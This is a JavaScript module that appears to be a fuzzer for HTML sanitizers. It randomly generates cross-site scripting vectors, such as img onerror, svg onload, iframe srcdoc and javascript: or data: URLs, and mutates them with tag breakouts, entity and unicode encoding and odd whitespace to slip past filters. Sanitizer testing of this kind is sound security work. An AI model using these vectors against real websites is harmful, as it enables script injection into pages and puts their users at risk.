var ProducerModule = (function() {
  var producer = {};

  var mediaCache = {};
  var dataURICache = {};

  var tagTemplates = {
    /* a dictionary of "capability" names and examples to exercise them.
     to exercise a cap we require a html construct of the following form:
     tagName: of course, the name of the html tag
     attributes: a dict of key/value pairs
     content: content between the opening and the closing tag.

     filling attribute values or content can be done by giving a pair of typeExample and an optional type (not required)
     in the form as a array with the length of two.
     content-types can be either type/subtype or just type (e.g. "image" or "image/gif", but not "image/*").

     */
    'CAP_INCLUDE_PAGE': [{'tagName': 'iframe', 'attributes': {'src': ['X-url', '']} } ], // the most powerful you can get...descending from here
    'CAP_EXECUTE_SCRIPT': [
      {'tagName': 'script', 'attributes': {}, 'content': ['X-payload', 'text/javascript']},
      {'tagName': 'script', 'attributes': {'src': ['X-url', 'text/javascript']} },
      {'tagName': 'img', 'attributes': {'src': ['X-url', 'image'], 'onload': ['X-payload', 'text/javascript']} },
      {'tagName': 'img', 'attributes': {'src': 'x', 'onerror': ['X-payload', 'text/javascript']} },
      {"tagName": "frameset", "attributes": {'onload': ['X-payload', 'text/javascript'] } },
      {"tagName": "input", "attributes": {"autofocus": "", "onfocus": ['X-payload', 'text/javascript']}}, //TODO doesnt work in frames :/
      {"tagName": "svg", "attributes": {"onload": ['X-payload', 'text/javascript']}},
      {"tagName": "table", "attributes": {"background": ['X-url', 'text/javascript']}},
      {"tagName": "A", "attributes": {"folder": ['X-url', 'text/javascript'],"style": "behavior:url(#default#AnchorClick);"}, "content": ['X-payload','text']},
      {"tagName": "object", "attributes": {"data":['X-url', 'text/javascript']}},
      {"tagName": "iframe", "attributes": {"srcdoc":['X-payload', 'text/html']} },
      {"tagName": "iframe", "attributes": {"src":['X-url', 'text/html']} },
      /*TODO
       replacing in attribute value :<
       {"tagName":"A","attributes":{"style":"-o-link:'javascript:alert(1)';-o-link-source:current"},"content":"X"},
       {"tagName":"STYLE","attributes":{},"content":"@import \"data:,*%7bx:expression(write(1))%7D\";"},
       */
    ],
    //TODO how to nest tags? e.g. <form id="test"></form><button form="test" formaction="javascript:alert(1)">X</button>

    'CAP_APPLY_STYLE': [{'tagName': 'span', 'attributes': {'style': ['X-payload', 'text/css'] } },
      {'tagName': 'style', 'attributes': {'type': 'text/css'}, 'content': ['X-payload', 'text/css'] },
      {'tagName': 'style', 'attributes': {'type': 'text/css', 'src': ['X-url', 'text/css']} }
    ],
    'CAP_MEDIA_IMAGE': [{'tagName': 'img', 'attributes': {'src': ['X-url', 'image']} } ],
    'CAP_MEDIA_AUDIO': [{'tagName': 'audio', 'attributes': {'autoplay': 'true', 'src': ['X-url', 'audio']} } ],
    'CAP_MEDIA_VIDEO': [{'tagName': 'video', 'attributes': {'autoplay': 'true', 'src': ['X-url', 'video']} } ],
    'CAP_SHOW_PAGE': [{'tagName': 'iframe', 'attributes': {'src': ['X-url', ''], 'sandbox': ''} } ],
    'CAP_TRIGGER_REQUEST': [
      {'tagName': 'link', 'attributes': {'rel':'prefetch', 'href': ['X-url', '']}, 'content':''} // prefetching
    ],
    'CAP_TRIGGER_DNS': [
      {'tagName': 'link', 'attributes': {'rel':'dns-prefetch', 'href': ['X-url', '']}, 'content':''} // dns-prefetching
    ],
    //TODO this cap requires our x-url/x-payload resolution function to replace the tag but not the whole attribute/content
    //'CAP_CHANGE_PAGE': [
    //  {'tagName': 'meta', 'attributes': {'http-requiv': 'refresh', 'content': '0; url=X-url'}}
    //]

    //XXX how do I (logically) get fonts in here? they are a subset of styles... :/
    // example: @font-face { font-family: Brankovic;     src: url('samples/brankovic.ttf');
    // several formats (ttf, woff, eot !?) , see e.g. http://fonts.googleapis.com/css?family=Londrina+Shadow
  }
  /* most other capabilities are somewhere in-between, since this is really hard to state fine-grained, I might not
   * be able to express this as a POSET :(
   * (see https://en.wikipedia.org/wiki/Partially_ordered_set)
   */
  tagTemplates['MAX'] = tagTemplates['CAP_INCLUDE_PAGE'];


  function typeToPath(resType) {
    // Category: payload (real content) or a url.
    // Type: content-type, either type/subtype or just type, not "type/*".
    if (resType == '') {
      // most capable or random? :/
      return CONFIG.res[choice(Object.keys(CONFIG.res))]; //res['text/html'];
    }
    if (resType.indexOf("/") == -1) { // have to search through keys... most capable or random? tricky :<
      var list = []
      for (var key in CONFIG.res) {
        var majorType = key.split("/")[0];
        if (majorType.indexOf(resType) == 0) {
          list.push(CONFIG.res[key]);
        }
      }
      return choice(list); // random.
    }
    else if (resType in CONFIG.res) { return CONFIG.res[resType]; }
    else { throw new Error("There was no resource found to satisfy this content type:" + resType); }
  }



  /* XXXXXXXXXXXXXXXXXXX

   // for attributes that require a piece of text:,
   res['attribute-payload'] = {
   'text/javascript': 'alert(1)',
   // this has to be something we can monitor, so url() should make us see the request
   'text/css': "box-shadow: 0 0 20px black, 20px 15px 30px yellow, -20px 15px 30px lime, -20px -15px 30px blue, 20px -15px 30px red; " +
   "background-image: url(" + typeExamples[attribute-url['image/gif']] + " );",
   }

   * */

  function makeURL(contenttype) {
    URL_LAYERS = {
      /**
       * functions(url,type,resolve):
       * url = string of the url,
       * type = content-type string like "text/html",
       * resolve = a method that allows the content of the url to be fetched (data urls require the content to be there, not pointed at :)),
       */
      'javascript': function(path, type) {
        // falling back to HTTP if type is not text/js
        if (type !== 'text/javascript') {
          // we just call our caller again to find a nother protocol
          // this might loop a few times, if the gods of randomness are not with us.
          return makeURL(type);
        }
        var content = makePayload(path);
        return 'javascript:' + content;
      },
      'data:': function(path, type) {
        if (type.indexOf('text') !== 0) { return makeURL(type); } // fallback for non-text content
       return 'data:' +type+ ',' + makePayload(path);
       },
      'data-base64': function(path, type) {
        if (path in dataURICache) {
          return dataURICache[path];
        } else {
          console.log("couldn't find cached data URI for path. Falling back to other URI scheme");
          return makeURL(type);
        }
      },
      'http': function(path, type) { return 'http://' + CONFIG.host + '/' + CONFIG.path + '/' + path;  },
      // TODO add https
    }
    URL_LAYERS['feed'] =  function(path, type) { return 'feed:' + makeURL(type); };
    URL_LAYERS['pcast'] = function(path, type) { return 'pcast:' + makeURL(type); },
    URL_LAYERS['view-source'] = function(path, type) { return 'view-source:' + makeURL(type);  } ;
    URL_LAYERS['chrobout'] = function(path, type) {
      if (type.indexOf("image") === 0) {
        return choice(['chrome://theme/IDR_PRODUCT_LOGO','about:logo']);
      } else {
        return makeURL(type);
      }
    }

    var path = typeToPath(contenttype)
    return URL_LAYERS[choice(Object.keys(URL_LAYERS))](path, contenttype);
  }
  function makePayload(path) {
    if (path in mediaCache) {
      return mediaCache[path];
    } else {
      throw new Error("Couldnt find media at "+path);
    }
  }
  function resolveResource(arr) {
    var resMethod = arr[0];
    var typ = arr[1];
    //console.log("resolving via " + resMethod + '('+typ+')')
    if (resMethod == "X-url") {
      return makeURL(typ)
    }
    else if (resMethod == "X-payload") {
      var path = typeToPath(typ);
      return makePayload(path);
    }
  }

  function choice(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
  }

  function templateToHTML(tmplObj) {
    var quoteChar = choice(["'", '"', ""]); // sometimes no-quotes are fine too :O

    // list of self-closing tags via http://stackoverflow.com/questions/97522/what-are-all-the-valid-self-closing-elements-in-xhtml-as-implemented-by-the-maj/8853550#8853550
    var selfClosing = ['area', 'base', 'br', 'col', 'embed', 'hr', 'img', 'input', 'keygen', 'link', 'menuitem',
                       'meta', 'param', 'source', 'track', 'wbr', 'basefont', 'bgsound', 'frame', 'isindex'
                      ];
    var tag = '<' + tmplObj['tagName'];
    for (var att in tmplObj['attributes']) {
      var attVal = tmplObj['attributes'][att];
      if (typeof attVal != "string") {         // resolve X-url, X-payload directive
        attVal = resolveResource(attVal);
      }
      var replFuncs = [function replAttWithEntities(x) {
                         return x.replace(/./g, function(c) {
                           return ('&#x' + c.charCodeAt(0).toString(16) + ';');
                       }); },
                       function DontReplAtAll(x) { return x }
                       ];
      if (att.indexOf("on") == 0) {
        // event handler, i.e. param can also take JS-type encodings
        replFuncs.push((function replAttWithUnicodeChars(x) {
                          return x.replace(/./g, function(c) {
                                                  var hx = c.charCodeAt(0).toString(16);
                                                  var zeroPad = "000".substr(0, 4-hx.length);
                                                  return "\\u" + zeroPad + hx + '';
                                                 });
                          }));
      }
      attVal = choice(replFuncs)(attVal);
      tag += ' '+ att + '=' + quoteChar + attVal + quoteChar; // concat with something like  src="srcVal"
    }
    if (selfClosing.indexOf(tmplObj['tagName']) == -1) { // i.e. not a self-closing tag
      tag += '>';
    } else {
      tag += '/>';
    }
    // We still allow content for self-closing tags. Interesting, eh... ?:)
    if ('content' in tmplObj) {
      if (typeof tmplObj['content'] != "string") {
        tmplObj['content'] = resolveResource(tmplObj['content']);
      }

      tag += tmplObj['content'];
    }
    if (selfClosing.indexOf(tmplObj['tagName']) == -1) { // i.e. not a self-closing tag
      tag += '</' + tmplObj['tagName'] +'>'
    }
    return tag;

  }



  function exerciseCapability(cap) {
    if (!(cap in tagTemplates)) {
      throw new Error("Capability is not defined")
    }
    var capCode = choice(tagTemplates[cap]); // randomly pick one
    return templateToHTML(capCode);
  }

  function mutate(inp) {
    var mutate_functions = [
      function prependBreakout(s) {
        var breakouts = ['</'+'script>',
                         ' -->',
                         '" ',
                         "' ",
                         '">',
                         "'>",
        ];
        return choice(breakouts) + s;
      },
      function replaceSpacesWithOther(s) {
        // See https://en.wikipedia.org/wiki/Whitespace_character + NUL + forward slash(works between attributes
        var wsp = ["\u0009", "\u000A", "\u000B", "\u000C", "\u000D", "\u0020", "\u0085", "\u00A0", "\u1680", "\u180E",
          "\u2000", "\u2001", "\u2002", "\u2003", "\u2004", "\u2005", "\u2006", "\u2007", "\u2008", "\u2009", "\u200A",
          "\u2028", "\u2029", "\u202F", "\u205F", "\u3000", "\u0000", "/"];
        return s.replace(/\s+/g, choice(wsp))
      },
    ];
    var mfunc = choice(mutate_functions);
    return mfunc(inp)
  }

  var tested = {};
  function getNewVector(cap) {
    var newVector;
    var tries = 0;
    do {
      newVector = mutate(exerciseCapability(cap));
      tries++;
      if (tries > 100) {
        /* this is a probabilistic criterion. just because randomness doesn't
        allow us to find new vectors, doesn't mean we're done :/ */
        var s="I failed to make a new vector. I tried a lot. Quitting."
        console.log(s); throw new Error(s);
      }
    } while (newVector in tested);
    tested[newVector] = true;
    return newVector;
  }

  // Initialize
  function init() {
    function cachePath(path) {
      if (typeof window === "undefined") {

        var fs = require("fs");

        var content = fs.readFileSync(path);
        mediaCache[path] = content;
        //TODO fyou nodejs., this doesn't work. :<
        /*var content = fs.readFile(path, {encoding: 'ucs2'}, function (err, data) {
         if (err) throw err;
         mediaCache[path] = content;
         callback(content);
         });*/
      } else {
        var xhr = new XMLHttpRequest();
        xhr.open("GET", path, true);
        if (typeof FileReader !== "undefined") {
          xhr.responseType = "blob";
          xhr.onload = function(e) {
            var blob = xhr.response;
            var reader = new FileReader();
            reader.onload = function(e) {
              jsString = e.target.result; // blob content
              mediaCache[path] = jsString;
            };// end reader.onload
            reader.readAsText(blob);
            // again for base 64:
            var reader64 = new FileReader();
            reader64.onload = function(e) {
              dataURICache[path] = e.target.result;
            }
            reader64.readAsDataURL(blob);
          }
        } else { // no FileReader e.g., MSIE9
          xhr.onload = function(e) {
            var resp = e.target.responseText;
            mediaCache[path] = resp;
            dataURICache[path] = 'data:,' + btoa(resp); // content-type?!
          }
        }
      };// end xhr.onload
      xhr.send();
    }
    // get all paths:
    for (var k in CONFIG.res) {
      cachePath(CONFIG.res[k]);
    }
  }
  init();

  producer.exerciseCapability = exerciseCapability;
  producer.getNewVector = getNewVector;
  producer.typeToPath = typeToPath
  producer.makeURL = makeURL
  producer.makePayload = makePayload
  producer.resolveResource = resolveResource
  producer.templateToHTML = templateToHTML
  producer.mediaCache = mediaCache;
  producer.dataURICache = dataURICache;
  producer.tested = tested;
  return producer;
})